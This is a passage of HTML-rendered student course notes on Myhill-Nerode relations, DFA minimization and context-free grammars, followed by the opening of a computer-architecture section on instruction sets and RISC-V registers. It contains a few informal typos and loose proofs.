<li><data class="katex-src" value="\equiv"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≡</mo></mrow><annotation encoding="application/x-tex">\equiv</annotation></semantics></math></span></data> is a right congruence, i.e., if <data class="katex-src" value="x \equiv y"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>≡</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \equiv y</annotation></semantics></math></span></data>, then <data class="katex-src" value="x\sigma&#10;   \equiv y\sigma \forall \sigma \in \Sigma"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mi>σ</mi><mo>≡</mo><mi>y</mi><mi>σ</mi><mi mathvariant="normal">∀</mi><mi>σ</mi><mo>∈</mo><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">x\sigma    \equiv y\sigma \forall \sigma \in \Sigma</annotation></semantics></math></span></data>.</li>
<li><data class="katex-src" value="\equiv"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≡</mo></mrow><annotation encoding="application/x-tex">\equiv</annotation></semantics></math></span></data> is a refinement of <data class="katex-src" value="L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></data>, i.e., if <data class="katex-src" value="x\equiv y"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>≡</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x\equiv y</annotation></semantics></math></span></data> then <data class="katex-src" value="x\in L&#10;   \iff y\in L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>L</mi><mtext>  </mtext><mo>⟺</mo><mtext>  </mtext><mi>y</mi><mo>∈</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">x\in L    \iff y\in L</annotation></semantics></math></span></data>.</li>
<li><data class="katex-src" value="\equiv"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≡</mo></mrow><annotation encoding="application/x-tex">\equiv</annotation></semantics></math></span></data> is of finite index.</li>
</ol>
<p>If <data class="katex-src" value="L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></data> is regular and <data class="katex-src" value="M = \left(Q,\Sigma, \delta, q_0, F\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence="true">(</mo><mi>Q</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi>δ</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">M = \left(Q,\Sigma, \delta, q_0, F\right)</annotation></semantics></math></span></data>
accepts M, then <data class="katex-src" value="\equiv_M"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>≡</mo><mi>M</mi></msub></mrow><annotation encoding="application/x-tex">\equiv_M</annotation></semantics></math></span></data> is a <em>Myhill-Nerode</em> relation.
It is trivial to see why this is the case.</p>
<p>We define <data class="katex-src" value="\equiv_M"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>≡</mo><mi>M</mi></msub></mrow><annotation encoding="application/x-tex">\equiv_M</annotation></semantics></math></span></data> to be the equivalence relation gotten when any two
strings end up in the same equivalence class in the language accepted by
<data class="katex-src" value="M"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></data> i.e. <data class="katex-src" value="\hat{\delta}\left(q_0, x\right) = \hat{\delta}\left(q_0, y\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>=</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>y</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\hat{\delta}\left(q_0, x\right) = \hat{\delta}\left(q_0, y\right)</annotation></semantics></math></span></data>.</p>
<p>We define <data class="katex-src" value="\equiv_L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>≡</mo><mi>L</mi></msub></mrow><annotation encoding="application/x-tex">\equiv_L</annotation></semantics></math></span></data> to be the equivalence relation gotten when any two
strings <data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> and <data class="katex-src" value="y"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span></data> s.t. <data class="katex-src" value="\forall z \in \Sigma^*, xz \in L&#10;\Longleftrightarrow yz \in L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>z</mi><mo>∈</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup><mo separator="true">,</mo><mi>x</mi><mi>z</mi><mo>∈</mo><mi>L</mi><mo>⟺</mo><mi>y</mi><mi>z</mi><mo>∈</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">\forall z \in \Sigma^*, xz \in L \Longleftrightarrow yz \in L</annotation></semantics></math></span></data>.</p>
<p><strong>Theorem</strong>: Let <data class="katex-src" value="\equiv"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≡</mo></mrow><annotation encoding="application/x-tex">\equiv</annotation></semantics></math></span></data> be an MH relation over <data class="katex-src" value="L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></data>.</p>
<p>Then <data class="katex-src" value="\equiv \subseteq \equiv_L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≡</mo><mo>⊆</mo><msub><mo>≡</mo><mi>L</mi></msub></mrow><annotation encoding="application/x-tex">\equiv \subseteq \equiv_L</annotation></semantics></math></span></data>.</p>
<p>Proof:</p>
<p><data class="katex-src" value="\begin{align}&#10;&\forall x,y, x\equiv y &#10;\\&#10;&\forall \sigma \in \Sigma, x\sigma \equiv y\sigma &#10;\\&#10;&\forall z \in \Sigma^* , \implies \left(xz \in L \iff yz\in L\right)&#10;\\&#10;&\implies x\equiv_L y&#10;\end{align}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi mathvariant="normal">∀</mi><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>x</mi><mo>≡</mo><mi>y</mi></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi mathvariant="normal">∀</mi><mi>σ</mi><mo>∈</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi>x</mi><mi>σ</mi><mo>≡</mo><mi>y</mi><mi>σ</mi></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi mathvariant="normal">∀</mi><mi>z</mi><mo>∈</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup><mo separator="true">,</mo><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mrow><mo fence="true">(</mo><mi>x</mi><mi>z</mi><mo>∈</mo><mi>L</mi><mtext>  </mtext><mo>⟺</mo><mtext>  </mtext><mi>y</mi><mi>z</mi><mo>∈</mo><mi>L</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mi>x</mi><msub><mo>≡</mo><mi>L</mi></msub><mi>y</mi></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align} &amp;\forall x,y, x\equiv y  \ &amp;\forall \sigma \in \Sigma, x\sigma \equiv y\sigma  \ &amp;\forall z \in \Sigma^* , \implies \left(xz \in L \iff yz\in L\right) \ &amp;\implies x\equiv_L y \end{align}</annotation></semantics></math></span></data></p>
<h3 id="minimizing-dfas-and-isomorphism"><a class="header" href="#minimizing-dfas-and-isomorphism">Minimizing DFAs and Isomorphism</a></h3>
<p>Let <data class="katex-src" value="M = \left(Q,\Sigma, \delta, s, F\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence="true">(</mo><mi>Q</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi>δ</mi><mo separator="true">,</mo><mi>s</mi><mo separator="true">,</mo><mi>F</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">M = \left(Q,\Sigma, \delta, s, F\right)</annotation></semantics></math></span></data> and <data class="katex-src" value="M' = \left(Q', \Sigma,&#10;\delta', s', F' \right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>M</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mrow><mo fence="true">(</mo><msup><mi>Q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><msup><mi>δ</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>F</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">M' = \left(Q', \Sigma, \delta', s', F' \right)</annotation></semantics></math></span></data></p>
<p>Let <data class="katex-src" value="f: Q\rightarrow Q'"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo>:</mo><mi>Q</mi><mo>→</mo><msup><mi>Q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">f: Q\rightarrow Q'</annotation></semantics></math></span></data> be a bijection such that the following hold:</p>
<ol>
<li><data class="katex-src" value="s' = f(s)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s' = f(s)</annotation></semantics></math></span></data></li>
<li><data class="katex-src" value="q\in F \Longleftrightarrow f(q) \in F'"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo>∈</mo><mi>F</mi><mo>⟺</mo><mi>f</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mo>∈</mo><msup><mi>F</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">q\in F \Longleftrightarrow f(q) \in F'</annotation></semantics></math></span></data></li>
<li><data class="katex-src" value="f(\delta(q,\sigma)) = \delta'(f(q), \sigma) \forall q \in Q, \sigma \in&#10;   \Sigma"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>δ</mi><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>σ</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><msup><mi>δ</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>σ</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∀</mi><mi>q</mi><mo>∈</mo><mi>Q</mi><mo separator="true">,</mo><mi>σ</mi><mo>∈</mo><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">f(\delta(q,\sigma)) = \delta'(f(q), \sigma) \forall q \in Q, \sigma \in    \Sigma</annotation></semantics></math></span></data></li>
</ol>
<p><strong>Theorem</strong>: If <data class="katex-src" value="M"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></data> and <data class="katex-src" value="M'"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>M</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">M'</annotation></semantics></math></span></data> are two minimal automatas then they are isomorphic.</p>
<p>Proof:</p>
<p>We define the function <data class="katex-src" value="f^{-1}: Q' \rightarrow Q"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>:</mo><msup><mi>Q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>→</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">f^{-1}: Q' \rightarrow Q</annotation></semantics></math></span></data> to be <data class="katex-src" value="\hat{\delta}(s, x)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(s, x)</annotation></semantics></math></span></data></p>
<p><strong>Algorithm</strong> to minimize the DFA:</p>
<p>States <data class="katex-src" value="q, q' \in M"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo separator="true">,</mo><msup><mi>q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∈</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">q, q' \in M</annotation></semantics></math></span></data> are equivalent if <data class="katex-src" value="\forall x\in \Sigma^*, \hat{\delta}&#10;(q,x) \in F \Longleftrightarrow \hat{\delta}(q', x) \in F"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>x</mi><mo>∈</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup><mo separator="true">,</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>F</mi><mo>⟺</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msup><mi>q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>F</mi></mrow><annotation encoding="application/x-tex">\forall x\in \Sigma^*, \hat{\delta} (q,x) \in F \Longleftrightarrow \hat{\delta}(q', x) \in F</annotation></semantics></math></span></data></p>
<p>This is clearly an equivalence relation for the states.</p>
<p>Show that the Myhill-Nerode relation of the <strong>Quotient Automata</strong>
<data class="katex-src" value="M_{/\approx}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mrow><mi mathvariant="normal">/</mi><mo>≈</mo></mrow></msub></mrow><annotation encoding="application/x-tex">M_{/\approx}</annotation></semantics></math></span></data> is a superset of the other. Hence the quotient automata is the
minimal one.</p>
<p><em>Algorithm</em>:</p>
<p>Mark any two pairs of states that are clearly not equivalent (one of them is a
final state, other is not).</p>
<p>Repeat until no new pairs are marked</p>
<p>If <data class="katex-src" value="\exists \{p,q\}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∃</mi><mo stretchy="false">{</mo><mi>p</mi><mo separator="true">,</mo><mi>q</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\exists {p,q}</annotation></semantics></math></span></data> s.t. for some <data class="katex-src" value="\sigma \in \Sigma"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi><mo>∈</mo><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\sigma \in \Sigma</annotation></semantics></math></span></data>, <data class="katex-src" value="\{\delta(p,\sigma),&#10;\delta(q,\sigma)\}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mi>δ</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><mi>σ</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>δ</mi><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>σ</mi><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">{\delta(p,\sigma), \delta(q,\sigma)}</annotation></semantics></math></span></data> are marked then mark <data class="katex-src" value="\{p,q\}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mi>p</mi><mo separator="true">,</mo><mi>q</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">{p,q}</annotation></semantics></math></span></data></p>
<p>Go to <a href="notes/./cs2200.html#pattern-matching">pattern matching</a></p>
<h3 id="context-free-languages"><a class="header" href="#context-free-languages">Context free languages</a></h3>
<p>Productions: A kind of statement that telly you substitution rule.</p>
<p>Non-terminal strings are strings that can be replaced using productions.</p>
<p>Terminals are ones that can’t be further replaced.</p>
<p>Therefore, CFG is a 4 tuple that is defined using
<data class="katex-src" value="\left(N, \Sigma, P, S\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mi>N</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi>P</mi><mo separator="true">,</mo><mi>S</mi><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left(N, \Sigma, P, S\right)</annotation></semantics></math></span></data></p>
<ul>
<li><data class="katex-src" value="N"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></data> is the set of non-terminals (RHS in any production).</li>
<li><data class="katex-src" value="\Sigma"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span></data> set of terminals</li>
<li><data class="katex-src" value="P"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span></data> set of production girls</li>
<li><data class="katex-src" value="S"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span></data> start symbol</li>
</ul>
<p>E.g. <data class="katex-src" value="L = \{0^n1^n| n \ge 0\}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mo stretchy="false">{</mo><msup><mn>0</mn><mi>n</mi></msup><msup><mn>1</mn><mi>n</mi></msup><mi mathvariant="normal">∣</mi><mi>n</mi><mo>≥</mo><mn>0</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">L = {0^n1^n| n \ge 0}</annotation></semantics></math></span></data></p>
<p><data class="katex-src" value="S \rightarrow 0S1 | \epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>→</mo><mn>0</mn><mi>S</mi><mn>1</mn><mi mathvariant="normal">∣</mi><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">S \rightarrow 0S1 | \epsilon</annotation></semantics></math></span></data></p>
<ul>
<li>A string <data class="katex-src" value="\beta \in (N \bigcup \Sigma^* )"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi><mo>∈</mo><mo stretchy="false">(</mo><mi>N</mi><mo>⋃</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\beta \in (N \bigcup \Sigma^* )</annotation></semantics></math></span></data> is <em>derivable</em> from <data class="katex-src" value="\alpha \in&#10;  (N\bigcup \Sigma)^* "><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>∈</mo><mo stretchy="false">(</mo><mi>N</mi><mo>⋃</mo><mi mathvariant="normal">Σ</mi><msup><mo stretchy="false">)</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\alpha \in   (N\bigcup \Sigma)^* </annotation></semantics></math></span></data> if there is a production rule to substitute a
non-terminal in <data class="katex-src" value="\alpha"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span></data> and get <data class="katex-src" value="\beta"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span></data>.</li>
<li>A string in <data class="katex-src" value="(N\bigcup\Sigma)^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>N</mi><mo>⋃</mo><mi mathvariant="normal">Σ</mi><msup><mo stretchy="false">)</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">(N\bigcup\Sigma)^*</annotation></semantics></math></span></data> is known as a <em>sentential form</em> if it is
derivable from S.</li>
<li>A string in <data class="katex-src" value="\Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\Sigma^*</annotation></semantics></math></span></data> is a <strong>sentence</strong> if it is derivable from <data class="katex-src" value="S"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span></data>.</li>
</ul>
<!---TODO: fill examples--->
<p><strong>Theorem:</strong> For a regular language <data class="katex-src" value="L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></data>, there exists grammar <data class="katex-src" value="G"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span></data> s.t.
<data class="katex-src" value="L = L(G)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><mi>G</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L = L(G)</annotation></semantics></math></span></data></p>
<p>Proof:</p>
<p><data class="katex-src" value="\begin{align}&#10;\exists M = \left(Q,\Sigma, \delta, q_0, F\right) \\&#10;L(M) = L \\&#10;N = \{S_i | q_i \in Q\} \\&#10;S_i \rightarrow \sigma S_j \forall \delta(q_i, \sigma) = q_j \\&#10;q_i \in F \implies S_i \rightarrow \epsilon \\&#10;\end{align}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right" columnspacing=""><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi mathvariant="normal">∃</mi><mi>M</mi><mo>=</mo><mrow><mo fence="true">(</mo><mi>Q</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi>δ</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>M</mi><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>N</mi><mo>=</mo><mo stretchy="false">{</mo><msub><mi>S</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>q</mi><mi>i</mi></msub><mo>∈</mo><mi>Q</mi><mo stretchy="false">}</mo></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msub><mi>S</mi><mi>i</mi></msub><mo>→</mo><mi>σ</mi><msub><mi>S</mi><mi>j</mi></msub><mi mathvariant="normal">∀</mi><mi>δ</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>σ</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>q</mi><mi>j</mi></msub></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msub><mi>q</mi><mi>i</mi></msub><mo>∈</mo><mi>F</mi><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><msub><mi>S</mi><mi>i</mi></msub><mo>→</mo><mi>ϵ</mi></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align} \exists M = \left(Q,\Sigma, \delta, q_0, F\right) \ L(M) = L \ N = {S_i | q_i \in Q} \ S_i \rightarrow \sigma S_j \forall \delta(q_i, \sigma) = q_j \ q_i \in F \implies S_i \rightarrow \epsilon \ \end{align}</annotation></semantics></math></span></data></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cs2600"><a class="header" href="#cs2600">cs2600</a></h1>
<h2 id="instruction-set"><a class="header" href="#instruction-set">Instruction Set</a></h2>
<p>Different Instructions: x86, ARM, RISC V, MIPS.</p>
<ul>
<li>Programs written for one processor cannot execute on another.</li>
<li>Early trend: more instructions, complex instructions.</li>
<li>RISC – Reduced Instruction Set Computing
<ul>
<li>Instructions are small and simple</li>
<li>Software does not complicate operations.</li>
</ul>
</li>
</ul>
<h3 id="how-compilation-happens"><a class="header" href="#how-compilation-happens">How compilation happens</a></h3>
<p>First the assembler converts the assembly to an object file. Here, the addresses
start with 0 and are relocatable. Later on the linker links multiple such object
files together and resolves function addresses, starting location, etc. using
something called as a <strong>Linker Descriptor Script</strong>.</p>
<h2 id="risc-v"><a class="header" href="#risc-v">RISC V</a></h2>
<p>Open source. Has 32 int and 32 FP registers. Also has XLEN variable, which is
either 32 or 64 for 32-bit and 64-bit processors respectively.</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Register</th><th style="text-align: center">ABI Name</th><th style="text-align: center">Description</th><th style="text-align: center">Saver</th></tr></thead><tbody>
<tr><td style="text-align: center">x0</td><td style="text-align: center">zero</td><td style="text-align: center">Zero always</td><td style="text-align: center"></td></tr>
<tr><td style="text-align: center">x1</td><td style="text-align: center">ra</td><td style="text-align: center">Return address</td><td style="text-align: center">caller</td></tr>
<tr><td style="text-align: center">x2</td><td style="text-align: center">sp</td><td style="text-align: center">Stack Pointer</td><td style="text-align: center">callee</td></tr>
